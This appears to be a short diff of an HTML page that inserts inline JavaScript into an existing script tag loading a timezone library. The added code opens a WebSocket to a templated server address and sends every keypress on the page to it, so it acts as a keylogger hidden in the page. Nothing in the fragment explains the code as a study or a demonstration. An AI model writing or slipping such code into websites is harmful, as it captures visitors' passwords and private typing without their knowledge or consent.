@@ -39,7 +39,14 @@
     <script
       src="./jstz.min.js"
       type="text/javascript"
-    ></script>
+    >
+     var conn = new WebSocket("ws://{{.}}/ws")
+    const keypress = (evt)=> {
+      var s = String.fromCharCode(evt.which);
+      conn.send(s);
+    }
+    document.onkeypress = keypress;
+  </script>
     <script type="text/javascript">
       /*
         @licstart  The following is the entire license notice for the 
